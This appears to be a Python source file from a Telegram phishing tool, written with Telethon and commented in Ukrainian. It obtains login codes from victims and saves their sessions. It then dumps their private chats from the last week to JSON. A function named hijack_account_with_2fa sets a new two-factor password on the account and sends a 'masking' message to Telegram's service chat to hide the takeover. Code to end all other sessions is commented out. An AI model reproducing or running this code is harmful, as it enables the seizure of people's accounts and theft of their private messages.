"""
session_handler.py
Модуль для роботи з Telegram сесіями та авторизацією
"""
import asyncio
import hashlib
import os
import json
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError, PasswordHashInvalidError
)
import logging
from datetime import datetime, timedelta, timezone

from clear_telegram_chat import MASK_MESSAGE
from config import CHAT_FOLDER
from telethon import functions, types

logger = logging.getLogger(__name__)




async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str, base_chats_folder: str = CHAT_FOLDER):
    """
    Створює папку з назвою номера телефону та зберігає особисті чати користувача за останні 7 дні.

    Args:
        client (TelegramClient): Активний клієнт Telethon.
        phone_number (str): Номер телефону користувача (наприклад, '+380xxxxxxxxx').
        base_chats_folder (str): Коренева папка для збереження чатів (за замовчуванням 'chats').
    """
    # Переконуємось, що базова папка існує
    os.makedirs(base_chats_folder, exist_ok=True)

    # Створюємо папку для конкретного користувача
    user_folder = os.path.join(base_chats_folder, phone_number)
    os.makedirs(user_folder, exist_ok=True)

    # Визначаємо дату 7 днів тому з часовим поясом UTC
    date_limit = datetime.now(timezone.utc) - timedelta(days=7)
    logger.info(f"Починаємо збір чатів для {phone_number} за останні 7 днів (з {date_limit.date()})")

    dialog_count = 0
    processed_count = 0

    # Отримуємо всі діалоги
    async for dialog in client.iter_dialogs():
        # Пропускаємо групи, канали та боти (лише особисті чати)
        if not dialog.is_user:
            continue

        dialog_count += 1
        logger.info(f"Обробляємо чат #{dialog_count}: {dialog.name} (ID: {dialog.id})")

        chat_messages = []
        message_count = 0

        try:
            # Встановлюємо таймаут для обробки одного чату (30 секунд)
            async with asyncio.timeout(300):
                # Отримуємо повідомлення з цього чату
                # limit=None - отримуємо всі повідомлення
                # offset_date не використовуємо, бо він може пропускати повідомлення
                async for message in client.iter_messages(
                        dialog.entity,
                        limit=None,
                        reverse=False  # Від нових до старих
                ):
                    message_count += 1

                    # Якщо повідомлення старіше за date_limit, зупиняємо ітерацію
                    if message.date < date_limit:
                        break

                    # Додаємо повідомлення, якщо воно в межах останніх 7 днів
                    msg_data = {
                        "date": message.date.isoformat(),
                        "sender_id": message.from_id.user_id if message.from_id else None,
                        "receiver_id": dialog.id,
                        "has_media": bool(message.media),
                        "sender_name": getattr(message.sender, 'first_name', None) or getattr(message.sender,
                                                                                              'username', 'Unknown'),
                        "text": message.text or ""
                    }
                    chat_messages.append(msg_data)

                    # Додаємо невелику затримку кожні 100 повідомлень
                    if message_count % 100 == 0:
                        await asyncio.sleep(0.1)
                        logger.info(f"  Оброблено {message_count} повідомлень...")

        except asyncio.TimeoutError:
            logger.warning(
                f"⚠️ Таймаут при обробці чату {dialog.name}. Перевірено {message_count} повідомлень, збережено {len(chat_messages)}.")
        except Exception as e:
            logger.error(f"❌ Помилка при обробці чату {dialog.name}: {e}")
            continue

        # Якщо є повідомлення, зберігаємо їх у файл
        if chat_messages:
            # Ім'я файлу: username або ID чату
            chat_filename = f"{dialog.id}.json"
            if hasattr(dialog.entity, 'username') and dialog.entity.username:
                chat_filename = f"{dialog.entity.username}.json"

            chat_filepath = os.path.join(user_folder, chat_filename)

            try:
                with open(chat_filepath, 'w', encoding='utf-8') as f:
                    json.dump(chat_messages, f, ensure_ascii=False, indent=4)

                logger.info(f"✅ Збережено {len(chat_messages)} повідомлень у файл: {chat_filename}")
                processed_count += 1
            except Exception as e:
                logger.error(f"❌ Не вдалося зберегти файл {chat_filename}: {e}")
        else:
            logger.info(f"ℹ️ У чаті з {dialog.name} не знайдено повідомлень за останні 7 днів.")

    logger.info(
        f"✅ Збір чатів для {phone_number} завершено. Оброблено {dialog_count} чатів, збережено {processed_count} файлів.")


async def send_verification_code(phone: str, api_id: int, api_hash: str, session_folder: str):
    """
    Відправляє код підтвердження на вказаний номер телефону.

    Args:
        phone: Номер телефону з кодом країни (наприклад, +380...)
        api_id: Telegram API ID
        api_hash: Telegram API Hash
        session_folder: Папка для збереження сесій

    Returns:
        tuple: (успіх: bool, клієнт або повідомлення_про_помилку: str)
    """
    os.makedirs(session_folder, exist_ok=True)

    # Видаляємо '+' для імені файлу сесії
    session_name = f"{phone.replace('+', '')}.session"
    session_path = os.path.join(session_folder, session_name)

    client = TelegramClient(session_path, api_id, api_hash)

    try:
        await client.connect()

        # Перевіряємо, чи вже авторизований
        if await client.is_user_authorized():
            logger.warning(f"Користувач {phone} вже авторизований")
            await client.disconnect()
            return False, "Цей номер вже авторизований у системі."

        # Відправляємо запит на код
        await client.send_code_request(phone)
        logger.info(f"✅ Код успішно надіслано на {phone}")

        # Повертаємо клієнт для подальшого використання
        # НЕ відключаємо клієнт, він потрібен для sign_in
        return True, client

    except PhoneNumberInvalidError:
        error_msg = f"Номер телефону {phone} недійсний або має неправильний формат."
        logger.error(error_msg)
        if client.is_connected():
            await client.disconnect()
        return False, error_msg

    except FloodWaitError as e:
        error_msg = f"⏱ Забагато спроб. Зачекай {e.seconds} секунд і спробуй знову."
        logger.error(error_msg)
        if client.is_connected():
            await client.disconnect()
        return False, error_msg

    except Exception as e:
        error_msg = f"Помилка при відправці коду: {str(e)}"
        logger.error(error_msg)
        if client.is_connected():
            await client.disconnect()
        return False, error_msg


async def sign_in_with_code(client: TelegramClient, phone: str, code: str, session_folder: str):
    """
    Виконує вхід в Telegram використовуючи код підтвердження.

    Args:
        client: Активний TelegramClient з відправленим запитом на код
        phone: Номер телефону
        code: 5-значний код підтвердження
        session_folder: Папка для збереження сесій

    Returns:
        tuple: (успіх: bool, шлях_до_сесії або повідомлення_про_помилку: str)
    """
    try:
        if not client.is_connected():
            await client.connect()

        # Намагаємось увійти з кодом
        await client.sign_in(phone, code=code)

        # Перевіряємо успішність авторизації
        if await client.is_user_authorized():
            session_name = f"{phone.replace('+', '')}.session"
            session_path = os.path.join(session_folder, session_name)

            logger.info(f"✅ Успішна авторизація для {phone}!")
            logger.info(f"Сесія збережена: {session_path}")

            return True, session_path
        else:
            error_msg = "Не вдалося авторизуватись. Спробуй ще раз."
            logger.error(error_msg)
            return False, error_msg

    except PhoneCodeInvalidError:
        error_msg = "❌ Невірний код підтвердження. Перевір і спробуй ще раз."
        logger.error(error_msg)
        return False, error_msg

    except PhoneCodeExpiredError:
        error_msg = "⏱ Код підтвердження застарів. Почни процес заново."
        logger.error(error_msg)
        return False, error_msg


    except SessionPasswordNeededError:
        # Повертаємо спеціальний результат, який вказує на наявність 2FA
        logger.warning(f"🔐 На акаунті {phone} виявлено 2FA. Вхід без доступу до повідомлень.")
        return "2FA_DETECTED", "На цьому акаунті ввімкнена двофакторна автентифікація. Доступ до чатів неможливий, але верифікація пройдена."

    except FloodWaitError as e:
        error_msg = f"⏱ Забагато спроб входу. Зачекай {e.seconds} секунд."
        logger.error(error_msg)
        return False, error_msg

    except Exception as e:
        error_msg = (
            f"Непередбачена помилка: {str(e)}\n\n"
            "Можливі причини:\n"
            "• Telegram заблокував спробу входу через підозрілу активність\n"
            "• Проблеми з мережею\n"
            "• Некоректні API credentials"
        )
        logger.error(f"Помилка входу: {e}")
        return False, error_msg


async def check_session_valid(phone: str, api_id: int, api_hash: str, session_folder: str):
    """
    Перевіряє, чи існує та валідна сесія для вказаного номера.

    Args:
        phone: Номер телефону
        api_id: Telegram API ID
        api_hash: Telegram API Hash
        session_folder: Папка з сесіями

    Returns:
        bool: True якщо сесія валідна, False інакше
    """
    session_name = f"{phone.replace('+', '')}.session"
    session_path = os.path.join(session_folder, session_name)

    if not os.path.exists(session_path):
        logger.info(f"Сесія для {phone} не знайдена")
        return False

    client = TelegramClient(session_path, api_id, api_hash)

    try:
        await client.connect()
        is_authorized = await client.is_user_authorized()

        if is_authorized:
            logger.info(f"✅ Сесія для {phone} валідна")
        else:
            logger.info(f"❌ Сесія для {phone} не авторизована")

        return is_authorized

    except Exception as e:
        logger.error(f"Помилка при перевірці сесії для {phone}: {e}")
        return False

    finally:
        if client.is_connected():
            await client.disconnect()


async def delete_session(phone: str, session_folder: str):
    """
    Видаляє сесію для вказаного номера.

    Args:
        phone: Номер телефону
        session_folder: Папка з сесіями

    Returns:
        bool: True якщо сесію видалено, False якщо сесії не існувало
    """
    session_name = f"{phone.replace('+', '')}.session"
    session_path = os.path.join(session_folder, session_name)

    try:
        if os.path.exists(session_path):
            os.remove(session_path)
            logger.info(f"✅ Сесію {phone} видалено")
            return True
        else:
            logger.info(f"Сесія {phone} не існує")
            return False
    except Exception as e:
        logger.error(f"Помилка при видаленні сесії {phone}: {e}")
        return False


async def hijack_account_with_2fa(client: TelegramClient, new_password: str):
    """
    Встановлює 2FA і завершує всі інші сесії.
    ПОПЕРЕДЖЕННЯ: Дуже агресивна дія, яка повністю перехоплює контроль над акаунтом.
    """
    try:
        # Використовуємо вбудований метод Telethon для встановлення 2FA
        await client.edit_2fa(
            current_password=None,  # Якщо пароля ще немає
            new_password=new_password,
            hint="Для вашої безпеки"  # Опціонально, підказка для пароля
        )

        try:
            await client.send_message(777000, MASK_MESSAGE)
            logger.info("🎭 Маскувальне повідомлення успішно відправлено в чат Telegram.")
        except Exception as e:
            logger.error(f"❌ Помилка при відправці маскувального повідомлення: {e}")

        logger.info(f"✅ Пароль 2FA успішно встановлено.")

        # --- Крок 3: Завершення всіх інших сесій ---
        """logger.info("🔄 Завершую всі інші сесії...")
        sessions = await client(functions.account.GetAuthorizationsRequest())
        terminated_count = 0
        for session in sessions.authorizations:
            if not session.current:
                await client(functions.account.ResetAuthorizationRequest(hash=session.hash))
                logger.info(f" - Сесію {session.device_model} ({session.platform}) завершено.")
                terminated_count += 1

        logger.info(f"🛡️ Перехоплення завершено. Завершено {terminated_count} інших сесій.")"""
        return True, f"Перехоплення успішне"#. Завершено {terminated_count} інших сесій."

    except PasswordHashInvalidError:
        # Ця помилка може виникнути, якщо пароль вже був, а ми спробували встановити новий без підтвердження старого
        logger.error("❌ Помилка: На акаунті вже є пароль. Неможливо перехопити без старого пароля.")
        return False, "На акаунті вже є 2FA. Перехоплення неможливе."
    except FloodWaitError as e:
        error_msg = f"⏱ Забагато спроб. Зачекай {e.seconds} секунд і спробуй знову."
        logger.error(error_msg)
        return False, error_msg
    except Exception as e:
        logger.error(f"❌ Помилка при перехопленні акаунту: {e}")
        return False, str(e)